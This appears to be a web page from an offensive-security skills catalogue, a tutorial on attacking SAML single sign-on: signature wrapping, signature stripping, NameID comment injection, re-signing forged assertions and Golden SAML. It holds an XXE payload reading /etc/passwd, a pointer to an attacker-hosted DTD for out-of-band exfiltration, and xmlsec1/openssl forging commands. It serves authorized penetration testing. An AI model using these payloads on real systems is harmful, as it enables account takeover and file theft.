@@ -1,0 +1,257 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>attacking-saml — SecSkills</title><link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ctext y='.9em' font-size='90'%3E%F0%9F%9B%A1%EF%B8%8F%3C/text%3E%3C/svg%3E"><link rel="stylesheet" href="style.css"><style>
+    .shead{padding:56px 0 34px}
+    .crumb{font-family:var(--mono);font-size:12.5px;color:var(--muted);margin-bottom:20px}
+    .crumb a{color:var(--muted)}
+    h1.sk{font-family:var(--mono);font-size:clamp(24px,4vw,36px);font-weight:600;letter-spacing:-.02em}
+    .stags{display:flex;gap:16px;align-items:center;margin-top:16px;font-family:var(--mono);font-size:12.5px;color:var(--muted);flex-wrap:wrap}
+    .sdesc{margin-top:22px;font-size:17px;color:var(--muted);max-width:70ch;line-height:1.55}
+    .inst{margin-top:22px;background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:13px 16px;font-family:var(--mono);font-size:13px;overflow-x:auto}
+    .inst .p{color:var(--faint);user-select:none}
+    article{padding:44px 0 72px;border-top:1px solid var(--border)}
+    article h2{font-size:20px;font-weight:640;margin:38px 0 12px;padding-top:6px}
+    article h3{font-size:16px;font-weight:640;margin:26px 0 8px}
+    article h4{font-size:14px;font-weight:640;margin:20px 0 6px;color:var(--muted)}
+    article p{margin:0 0 15px;max-width:74ch}
+    article ul,article ol{margin:0 0 16px;padding-left:22px;max-width:74ch}
+    article li{margin:5px 0}article li>ul{margin:5px 0}
+    article code{font-family:var(--mono);font-size:.86em;background:var(--surface);padding:1px 5px;border-radius:4px}
+    article a.xref code{color:var(--accent);background:color-mix(in srgb,var(--accent) 9%,var(--surface))}
+    article pre{background:var(--surface);border:1px solid var(--border);border-radius:8px;
+    padding:15px 16px;overflow-x:auto;margin:0 0 18px;max-width:100%}
+    article pre code{background:none;padding:0;font-size:12.5px;line-height:1.7}
+    article blockquote{margin:0 0 18px;padding:2px 0 2px 18px;border-left:2px solid var(--border2);color:var(--muted)}
+    .tw{overflow-x:auto;margin:0 0 18px}article table{border-collapse:collapse;width:100%;font-size:14px}
+    article th,article td{text-align:left;padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    article th{font-family:var(--mono);font-size:12px;color:var(--muted);font-weight:600}
+    </style></head><body>
+<div class="top"><div class="wrap"><a class="brand" href="index.html">secskills</a>
+<nav><a href="index.html#catalog">← all skills</a><a href="https://github.com/trilwu/secskills">github</a></nav>
+<button class="tbtn" id="tbtn" aria-label="Toggle theme">theme</button></div></div>
+<header class="shead"><div class="wrap">
+  <div class="crumb"><a href="index.html">secskills</a> / offense / attacking-saml</div>
+  <h1 class="sk">attacking-saml</h1>
+  <div class="stags">
+    <span><span class="dot dot-offense"></span> offense</span>
+    <span class="v"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg> verified 2026-07-26</span>
+  </div>
+  <p class="sdesc">Attack SAML single sign-on by decoding and tampering with signed XML assertions — XML signature wrapping (XSW1-XSW8), signature stripping, assertion and attribute tampering, NameID comment injection, XXE through the SAML parser, certificate faking, recipient confusion and IdP-initiated replay, and Golden SAML forgery. Use when a request carries a `SAMLRequest` or `SAMLResponse` parameter, when base64+deflate decodes to XML with `&lt;saml:Assertion&gt;`, when the target exposes a `/saml/acs` or `/sso` endpoint, when an IdP-initiated login lands an assertion at the SP, or when federation runs through Okta, ADFS, Ping, or Azure/Entra.</p>
+  <div class="inst"><span class="p">$ </span>/plugin install secskills-offense
+<span class="p">$ </span>/plugin install secskills-core</div>
+</div></header>
+<article><div class="wrap"><p>SAML security is XML signature validation, and XML signatures are notoriously hard to validate correctly. The assertion is signed — but which element is signed, what the XML parser reads, and what the application ultimately trusts can be three entirely different things. That gap is XML Signature Wrapping, and it is the reason SAML breaks far more often than its cryptography suggests.</p>
+<p>Only against systems you are authorized to test.</p>
+<h2>When to Use</h2>
+<ul>
+<li>A request or redirect carries a <code>SAMLRequest</code> or <code>SAMLResponse</code> parameter</li>
+<li>Base64 (plus DEFLATE for the redirect binding) decodes to XML containing</li>
+</ul>
+<p><code>&amp;lt;saml:Assertion&amp;gt;</code>, <code>&amp;lt;samlp:Response&amp;gt;</code>, or <code>&amp;lt;saml:Subject&amp;gt;</code></p>
+<ul>
+<li>The target exposes a <code>/saml/acs</code>, <code>/sso</code>, <code>/saml2/acs</code>, or <code>/Shibboleth.sso</code></li>
+</ul>
+<p>Assertion Consumer Service endpoint</p>
+<ul>
+<li>An IdP-initiated login POSTs an assertion straight to the SP with no prior</li>
+</ul>
+<p><code>AuthnRequest</code></p>
+<ul>
+<li>Federation runs through Okta, ADFS, PingFederate, Azure/Entra, Shibboleth,</li>
+</ul>
+<p>SimpleSAMLphp, or Keycloak</p>
+<ul>
+<li>You control a low-privilege federated account and want to reach another</li>
+</ul>
+<p>identity or role</p>
+<h2>When NOT to Use</h2>
+<ul>
+<li><strong>The SSO flow is OAuth 2.0 or OpenID Connect</strong> (<code>code</code>, <code>id_token</code>,</li>
+</ul>
+<p><code>access_token</code>, <code>/authorize</code>, <code>/.well-known/openid-configuration</code>) — use <a class="xref" href="attacking-oauth-oidc.html"><code>attacking-oauth-oidc</code></a></p>
+<ul>
+<li><strong>The token is a JWT</strong> (<code>eyJ...</code> with dot separators) rather than signed</li>
+</ul>
+<p>XML — use <a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a></p>
+<ul>
+<li><strong>General web testing</strong> with no SAML artifact in scope — use</li>
+</ul>
+<p><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a></p>
+<ul>
+<li><strong>Golden SAML against a compromised AD FS server or cloud tenant</strong> where you</li>
+</ul>
+<p>already hold the token-signing key — that is a tenant-takeover play in <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></p>
+<ul>
+<li><strong>Evaluating the signature primitives themselves</strong> (SHA-1 vs SHA-256, RSA</li>
+</ul>
+<p>key size, canonicalization algorithm choice) — use <a class="xref" href="reviewing-cryptography.html"><code>reviewing-cryptography</code></a></p>
+<h2>Decode and Inspect</h2>
+<p>Everything starts with reading the message. The wire format depends on the binding.</p>
+<pre><code># HTTP-Redirect binding: base64 then raw DEFLATE (no zlib header)
+echo 'fVLLbtsw...' | base64 -d | python3 -c \
+  "import sys,zlib; sys.stdout.write(zlib.decompress(sys.stdin.buffer.read(),-15).decode())"
+
+# HTTP-POST binding: plain base64, no deflate
+echo 'PHNhbWxwOl...' | base64 -d | xmllint --format -</code></pre>
+<p>The redirect binding uses raw DEFLATE — window bits <code>-15</code>, no header. The POST binding does not deflate at all. Guess wrong and you get garbage; try both.</p>
+<p><strong>SAML Raider</strong> (Burp extension) is the working environment: it intercepts the ACS POST, pretty-prints the XML, imports the IdP certificate, and drives the signature-wrapping attacks below with a single click. Install it before doing anything by hand.</p>
+<p><strong>samltool.com</strong> (SAMLtool by OneLogin) decodes and re-encodes messages and is useful for understanding structure — but treat it as offline reference only. Never paste a live production assertion into a third-party website; decode with the commands above instead.</p>
+<p>Read these fields first, because they define every attack that follows:</p>
+<ul>
+<li><code>&amp;lt;ds:Signature&amp;gt;</code> — where it sits and what its <code>&amp;lt;ds:Reference URI="#..."&amp;gt;</code></li>
+</ul>
+<p>points to. This is the whole game.</p>
+<ul>
+<li><code>&amp;lt;saml:Subject&amp;gt;&amp;lt;saml:NameID&amp;gt;</code> — the identity being asserted</li>
+<li><code>&amp;lt;saml:AttributeStatement&amp;gt;</code> — roles, groups, email, entitlements</li>
+<li><code>&amp;lt;saml:Conditions&amp;gt;</code> — <code>NotBefore</code>, <code>NotOnOrAfter</code>, <code>AudienceRestriction</code></li>
+<li><code>&amp;lt;saml:SubjectConfirmationData&amp;gt;</code> — <code>Recipient</code>, <code>NotOnOrAfter</code>, <code>InResponseTo</code></li>
+<li><code>Destination</code> and <code>Issuer</code> on the response envelope</li>
+</ul>
+<h2>XML Signature Wrapping (XSW)</h2>
+<p>The core SAML attack. The signature is cryptographically valid, but you move the signed element somewhere the signature checker still accepts it while the application logic reads a <em>different</em>, unsigned assertion that you control. The verifier and the consumer disagree about which element is authoritative.</p>
+<p>The eight canonical variants (Somorovsky et al.) differ in where the original signed assertion is relocated and where the forged one is injected:</p>
+<ul>
+<li><strong>XSW1 / XSW2</strong> — wrap the whole <code>&amp;lt;Response&amp;gt;</code>; the signature references the</li>
+</ul>
+<p>original response while a forged response is processed. XSW2 uses a non-enveloping signature position.</p>
+<ul>
+<li><strong>XSW3 / XSW4</strong> — assertion-level. XSW3 makes the forged assertion a</li>
+</ul>
+<p><em>sibling</em> of the signed one; XSW4 <em>nests</em> the signed assertion inside the forged one. Same or overlapping IDs.</p>
+<ul>
+<li><strong>XSW5 / XSW6</strong> — the copied assertion envelopes the signature; play games</li>
+</ul>
+<p>with the <code>ID</code> attribute so the reference still resolves.</p>
+<ul>
+<li><strong>XSW7 / XSW8</strong> — hide in a loose-schema wrapper. XSW7 puts the <em>forged</em></li>
+</ul>
+<p>assertion in an <code>&amp;lt;Extensions&amp;gt;</code> element; XSW8 buries the <em>original</em> signed one in an <code>&amp;lt;Object&amp;gt;</code> so it validates but is never consumed.</p>
+<pre><code># Attack in SAML Raider:
+#   1. Intercept the ACS POST, select the signed assertion
+#   2. Edit NameID / attributes in the assertion the app will read
+#   3. Click XSW1..XSW8 in turn — each rebuilds the document layout
+#   4. Forward; watch for a successful login as the forged identity</code></pre>
+<p>Iterate through <strong>all eight</strong>. Which one works depends entirely on the SP's XML library and how it selects the assertion to trust — there is no way to predict it, so try every variant before concluding the SP is safe. A successful login as a NameID you never legitimately held is the finding.</p>
+<h2>Unsigned Assertions and Signature Stripping</h2>
+<p>Before the wrapping games, test the simplest failure: does the SP verify a signature at all?</p>
+<ul>
+<li><strong>Strip the signature.</strong> Remove <code>&amp;lt;ds:Signature&amp;gt;</code> entirely and forward. Some</li>
+</ul>
+<p>SPs only verify a signature <em>if one is present</em>.</p>
+<ul>
+<li><strong>Empty the signature.</strong> Blank the <code>SignatureValue</code> or <code>DigestValue</code>.</li>
+<li><strong>Sign the wrong thing.</strong> Sign the response but not the assertion, or vice</li>
+</ul>
+<p>versa, when the SP only checks one.</p>
+<ul>
+<li><strong>Downgrade the algorithm.</strong> Try <code>SignatureMethod</code> of SHA-1 or even</li>
+</ul>
+<p><code>md5</code>/no-op where the SP does not pin the expected algorithm.</p>
+<pre><code># xmlsec1 can tell you what a document's signature actually covers
+xmlsec1 --verify --pubkey-cert-pem idp.crt --id-attr:ID Assertion response.xml</code></pre>
+<p>If the SP accepts a stripped or unsigned assertion, you can forge identity with no cryptography at all — the highest-severity SAML outcome.</p>
+<h2>Assertion Tampering</h2>
+<p>Once you can get an assertion accepted (stripped, unsigned, or via a working XSW variant), change what it claims:</p>
+<ul>
+<li><strong>NameID</strong> — swap to a target user (<code>admin@corp</code>, another tenant's user)</li>
+<li><strong>Attributes</strong> — flip <code>Role</code>/<code>Group</code>/<code>memberOf</code> to <code>admin</code>, add</li>
+</ul>
+<p>entitlement attributes the IdP never issued, change <code>email</code> to trigger account linking on the SP</p>
+<ul>
+<li><strong>AudienceRestriction</strong> — if the SP does not check <code>&amp;lt;Audience&amp;gt;</code>, an assertion</li>
+</ul>
+<p>minted for <em>another</em> SP in the same federation is replayable here</p>
+<ul>
+<li><strong>NotOnOrAfter / NotBefore</strong> — a wide or unchecked validity window lets you</li>
+</ul>
+<p>replay a captured assertion long after it should have expired</p>
+<ul>
+<li><strong>InResponseTo</strong> — for the SP-initiated flow, whether the SP binds the</li>
+</ul>
+<p>response to its own <code>AuthnRequest</code> ID; if not, injected/replayed responses are accepted</p>
+<p>Test each independently. An SP that validates the signature but ignores <code>AudienceRestriction</code> or the replay window is still fully exploitable.</p>
+<h2>Comment Injection in NameID</h2>
+<p>A canonicalization bug in several SAML libraries (the 2018 Duo/<code>python-saml</code>/ <code>OneLogin</code> class of CVEs). XML text-node handling and signature canonicalization disagree about how an XML comment splits a text node.</p>
+<pre><code>&lt;saml:NameID&gt;admin&lt;!----&gt;@evil.com&lt;/saml:NameID&gt;</code></pre>
+<p>The signature is computed over the canonicalized value (which may drop the comment or concatenate the nodes), while the application's text extraction reads only the node <em>before</em> the comment — yielding <code>admin</code>. So a validly signed assertion for <code>admin@evil.com</code> (an account you legitimately own) authenticates you as <code>admin</code>. Try comments inside any identity-bearing field: NameID, and email/username attributes used for account mapping.</p>
+<h2>XXE via the SAML Parser</h2>
+<p>The SP feeds attacker-supplied XML into a parser. If external entities are not disabled, the ACS endpoint is an XXE sink.</p>
+<pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE samlp:Response [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;samlp:Response ...&gt;...&amp;xxe;...&lt;/samlp:Response&gt;</code></pre>
+<p>Use an out-of-band DTD (<code>http://attacker/evil.dtd</code>) for blind file read and SSRF into the SP's internal network. The full technique — parameter entities, OOB exfiltration, error-based leakage — is in <a class="xref" href="exploiting-xxe.html"><code>exploiting-xxe</code></a>; the SAML angle is simply that the assertion is the injection point and the ACS is unauthenticated.</p>
+<h2>Certificate Faking and Self-Signed Re-Signing</h2>
+<p>If the SP does not pin the IdP's certificate — instead trusting whatever cert is embedded in <code>&amp;lt;ds:KeyInfo&amp;gt;</code>, or accepting any cert from a broad CA bundle — you can strip the real signature, re-sign with your own key, and ship your cert in the message.</p>
+<pre><code># Generate a key/cert and re-sign a tampered assertion
+openssl req -x509 -newkey rsa:2048 -keyout evil.key -out evil.crt -days 30 -nodes -subj "/CN=idp"
+xmlsec1 --sign --privkey-pem evil.key,evil.crt \
+        --id-attr:ID Assertion tampered.xml &gt; forged.xml</code></pre>
+<p>SAML Raider automates this: "Send Certificate" imports/generates a cert, then resigns the edited message in place. If the forged self-signed assertion is accepted, the SP is trusting the message's own embedded key instead of a pinned IdP cert — complete authentication bypass.</p>
+<h2>Recipient / Destination Confusion and IdP-Initiated Replay</h2>
+<ul>
+<li><strong>Recipient / Destination not checked.</strong> If the SP ignores the <code>Recipient</code></li>
+</ul>
+<p>in <code>SubjectConfirmationData</code> or the <code>Destination</code> on the response, an assertion captured at one SP replays at another that shares the IdP.</p>
+<ul>
+<li><strong>IdP-initiated replay.</strong> IdP-initiated SSO has no <code>AuthnRequest</code> to bind to,</li>
+</ul>
+<p>so there is no <code>InResponseTo</code> and often no anti-replay state. Capture a valid IdP-initiated POST and re-send it — within the validity window it may log you straight back in. A leaked assertion in logs, referrers, or history becomes a usable credential.</p>
+<ul>
+<li><strong>Token reuse across tenants.</strong> In multi-tenant SaaS, check whether an</li>
+</ul>
+<p>assertion issued for tenant A is accepted at tenant B's ACS.</p>
+<h2>Golden SAML</h2>
+<p>The endgame, not the entry point. If you already hold the IdP's private <strong>token-signing key</strong> (stolen from an AD FS server's certificate store, an Azure/Entra federation trust, or an exported IdP keystore), you forge arbitrary, perfectly-signed assertions for any user, any role, indefinitely — no credentials, no MFA, no IdP interaction, and it survives password resets.</p>
+<pre><code># With the stolen signing key, mint an assertion for any identity
+xmlsec1 --sign --privkey-pem tokensigning.key,tokensigning.crt \
+        --id-attr:ID Assertion golden.xml &gt; any-user.xml</code></pre>
+<p>Obtaining the key is a host/tenant-compromise task, not a SAML-message task — that path (extracting the AD FS token-signing cert, DKM key, or cloud federation secret) lives in <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a>. Come back here only to shape the forged assertion.</p>
+<h2>Rationalizations to Reject</h2>
+<ul>
+<li><em>"The assertion is signed, so it can't be tampered with."</em> Signature</li>
+</ul>
+<p>wrapping keeps the signature valid while the app reads a different element. Signed does not mean the signed thing is what gets trusted.</p>
+<ul>
+<li><em>"XSW1 didn't work, so the SP is safe."</em> There are eight variants for a</li>
+</ul>
+<p>reason. Run all of XSW1–XSW8 before concluding anything.</p>
+<ul>
+<li><em>"It verifies the signature — I checked."</em> Verifying <em>a</em> signature is not</li>
+</ul>
+<p>verifying <em>the assertion you consume</em>. And it may only verify when one is present; strip it and test.</p>
+<ul>
+<li><em>"The audience/recipient is just metadata."</em> If the SP doesn't enforce</li>
+</ul>
+<p><code>AudienceRestriction</code>, <code>Recipient</code>, and <code>Destination</code>, assertions replay across SPs and tenants.</p>
+<ul>
+<li><em>"The comment thing is cosmetic."</em> <code>admin&amp;lt;!----&amp;gt;@evil.com</code> authenticates as</li>
+</ul>
+<p><code>admin</code>. Canonicalization mismatches are full account takeover.</p>
+<ul>
+<li><em>"It's XML from a trusted IdP, so XXE isn't a concern."</em> The ACS parses the</li>
+</ul>
+<p>bytes before it trusts them, and the bytes come from your browser. Untrusted.</p>
+<ul>
+<li><em>"Golden SAML needs the private key, so it's out of scope."</em> Forging the</li>
+</ul>
+<p>assertion is in scope here; note the exposure and route key extraction to <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a> — don't dismiss the impact.</p>
+<h2>ATT&amp;CK Coverage</h2>
+<p><em>Generated from <code>secskills-core/ttp-index.json</code> — edit that file, then run <code>python3 scripts/sync_attack.py --write</code>. Re-verify IDs against the current ATT&amp;CK release before citing them in a report.</em></p>
+<p><strong>Credential Access</strong> (TA0006)</p>
+<ul>
+<li><a href="https://attack.mitre.org/techniques/T1606/002/">T1606.002</a> SAML Tokens — see also <a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a></li>
+</ul>
+<p>Detection content for any of these: <a class="xref" href="engineering-detections.html"><code>engineering-detections</code></a>. Proactive search: <a class="xref" href="hunting-threats.html"><code>hunting-threats</code></a>. Post-compromise: <a class="xref" href="responding-to-incidents.html"><code>responding-to-incidents</code></a>.</p>
+<h2>References</h2>
+<ul>
+<li><a class="xref" href="attacking-oauth-oidc.html"><code>attacking-oauth-oidc</code></a> — when the SSO flow is OAuth 2.0 / OpenID Connect</li>
+<li><a class="xref" href="attacking-jwt.html"><code>attacking-jwt</code></a> — when the token is a signed JWT rather than XML</li>
+<li><a class="xref" href="exploiting-xxe.html"><code>exploiting-xxe</code></a> — full XXE technique when the ACS parser is the sink</li>
+<li><a class="xref" href="attacking-entra-id.html"><code>attacking-entra-id</code></a> — Golden SAML via a compromised AD FS server or tenant</li>
+<li><a class="xref" href="testing-web-applications.html"><code>testing-web-applications</code></a> — the surrounding web methodology</li>
+<li><a class="xref" href="reporting-security-findings.html"><code>reporting-security-findings</code></a> — severity for signature-bypass and replay</li>
+<li>SAML Raider (Burp extension), Burp Suite, xmlsec1, SAMLtool (samltool.com)</li>
+</ul></div></article>
+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script></body></html>
